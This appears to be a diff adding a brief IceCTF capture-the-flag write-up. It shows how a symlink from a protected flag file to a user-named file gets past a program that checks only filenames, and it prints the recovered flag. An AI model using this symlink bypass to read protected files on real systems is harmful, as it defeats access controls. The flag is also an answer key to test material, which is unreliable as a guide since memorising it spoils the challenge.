@@ -1,0 +1,12 @@
+ln -s /home/cow/flag.txt redir.cow
+Create symlink from /home/cow/flag.txt to $HOME/redir.cow
+/home/cow/cow redir.cow
+execute cow. it only checks for the direct filename and doesnt recognize symlinks
+ --------------------------- 
+< flag_moo_moo_the_cow_says >
+ --------------------------- 
+  |  ^__^
+   - (xx)|________
+     (__)| IceCTF )/|/
+         ||-----w |
+        ||      ||
